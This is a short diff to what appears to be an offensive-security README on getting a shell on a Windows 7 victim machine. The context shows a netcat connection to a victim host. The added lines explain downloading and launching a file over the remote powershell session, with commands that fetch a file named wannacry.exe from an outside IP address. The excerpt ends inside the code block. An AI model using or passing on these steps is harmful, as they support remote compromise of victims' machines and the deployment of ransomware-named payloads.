@@ -68,8 +68,11 @@ $netcat -v victim_ip 4444
 ### Win <= 7 Bind reverse shell \[ powershell.exe \]
 
 <img src="https://zupimages.net/up/19/01/wq32.png">
-
+ 
+After to be connected to the powershell, you can download and launch some file with this method :
+ 
 ```
+[ powershell command ]
 >dir env:\
 > $url=http://192.168.0.2/wannacry.exe
 > wget $url -outfile [ PATH ]
